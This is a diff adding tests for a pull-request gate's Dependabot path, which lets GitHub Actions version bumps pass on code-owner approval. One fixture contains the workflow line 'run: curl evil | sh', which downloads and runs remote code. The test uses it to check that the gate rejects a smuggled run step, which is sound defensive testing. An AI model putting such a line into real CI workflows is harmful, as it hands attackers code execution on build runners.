@@ -1814,3 +1814,85 @@ test("pending at the reviewed head: a verdict with no pending is unchanged", () 
     assert.equal(evaluatePr(api, "o/r", 5, config).state, "success", JSON.stringify(pending));
   }
 });
+
+// ---- ADR 0032 parts 3 and 4 (#706): the Dependabot narrow path ----
+const bumpCfg = (actionBumps) => compileConfig({ requiredChecks: ["verify"], paths: { skip: ["^docs/"], contract: [], sensitive: [], ui: [] }, dependabot: { actionBumps } });
+const bumpPatchText = `@@ -1,3 +1,3 @@\n a\n-  - uses: actions/checkout@${"1".repeat(40)} # v4\n+  - uses: actions/checkout@${"2".repeat(40)} # v5\n b`;
+const patchLines = (patch, over = {}) => JSON.stringify({ filename: ".github/workflows/ci.yml", status: "modified", previous_filename: null, patch, ...over }) + "\n";
+const DEPENDABOT = { login: "dependabot[bot]", type: "Bot" };
+// Both files calls share one path; the patch call is the one whose --jq asks for the patch.
+function bumpApi(author, filesPatchOut, { reviews = [] } = {}) {
+  const { api: inner } = fakeApi({
+    "repos/o/r/pulls/5": { state: "open", body: "Bumps actions", user: author, head: { sha: SHA, ref: "dependabot/github_actions/x" } },
+    [`repos/o/r/commits/${SHA}/statuses?per_page=100`]: [],
+    "repos/o/r/pulls/5/reviews": commentsOut(reviews),
+  });
+  const patchCalls = [];
+  const api = (args) => {
+    if (args[0] === "repos/o/r/pulls/5/files") {
+      if (args.at(-1).includes("patch")) {
+        patchCalls.push(args);
+        if (filesPatchOut instanceof Error) throw filesPatchOut;
+        return filesPatchOut;
+      }
+      return ".github/workflows/ci.yml\n";
+    }
+    return inner(args);
+  };
+  return { api, patchCalls };
+}
+const approvedBy = (login) => [{ user: { login, type: "User" }, state: "APPROVED", commit_id: SHA }];
+const evalBump = (api, cfg) => teamCheckout(OWNERS, () => evaluatePr(api, "o/r", 5, cfg));
+
+test("dependabot: a bump waits for the owner, then passes on their approval, with no issue or reviewer", () => {
+  const cfg = bumpCfg(true);
+  const waiting = bumpApi(DEPENDABOT, patchLines(bumpPatchText));
+  assert.equal(evalBump(waiting.api, cfg).description, "waiting for a code-owner review in GitHub (dependabot action bump)");
+  const ok = bumpApi(DEPENDABOT, patchLines(bumpPatchText), { reviews: approvedBy("code-owner") });
+  const d = evalBump(ok.api, cfg);
+  assert.equal(d.state, "success");
+  assert.match(d.description, /dependabot action bump/);
+  assert.ok(ok.patchCalls[0].includes("--paginate"));
+});
+
+test("dependabot: the switch off makes no extra call and fails as today", () => {
+  for (const cfg of [bumpCfg(false), bumpCfg(undefined)]) {
+    const { api, patchCalls } = bumpApi(DEPENDABOT, patchLines(bumpPatchText));
+    assert.equal(evalBump(api, cfg).description, "PR body must say 'Closes #N' for its task issue");
+    assert.equal(patchCalls.length, 0);
+  }
+});
+
+test("dependabot: a non-Dependabot PR never makes the extra call", () => {
+  const { api, patchCalls } = bumpApi({ login: "leo", type: "User" }, patchLines(bumpPatchText));
+  assert.equal(evalBump(api, bumpCfg(true)).state, "failure");
+  assert.equal(patchCalls.length, 0);
+});
+
+test("dependabot: a fetch error, bad JSON or a missing patch passes 'not a bump' and the normal rules apply", () => {
+  const normal = "PR body must say 'Closes #N' for its task issue";
+  for (const out of [new Error("boom"), "not json\n", patchLines(undefined, { patch: undefined })]) {
+    const { api, patchCalls } = bumpApi(DEPENDABOT, out, { reviews: approvedBy("code-owner") });
+    assert.equal(evalBump(api, bumpCfg(true)).description, normal);
+    assert.equal(patchCalls.length, 1);
+  }
+});
+
+test("dependabot: a human push adding a run: change falls back to the normal rules and fails", () => {
+  const patch = "@@ -1,3 +1,3 @@\n a\n-  - run: echo a\n+  - run: curl evil | sh\n b";
+  const { api } = bumpApi(DEPENDABOT, patchLines(patch), { reviews: approvedBy("code-owner") });
+  assert.equal(evalBump(api, bumpCfg(true)).state, "failure");
+});
+
+test("dependabot merge_group: carry re-decides a bump the same as evaluatePr", () => {
+  const cfg = bumpCfg(true);
+  const queueRef = `gh-readonly-queue/main/pr-5-${"c".repeat(40)}`;
+  for (const reviews of [[], approvedBy("code-owner")]) {
+    const mk = () => bumpApi(DEPENDABOT, patchLines(bumpPatchText), { reviews }).api;
+    const direct = evalBump(mk(), cfg);
+    const queued = teamCheckout(OWNERS, () => carry(mk(), "o/r", queueRef, "b".repeat(40), cfg));
+    // The queue carries only a success; an unapproved bump (pending on the head) is a failure there, never a pass.
+    assert.equal(queued.state, direct.state === "success" ? "success" : "failure");
+    assert.equal(queued.description, direct.description);
+  }
+});
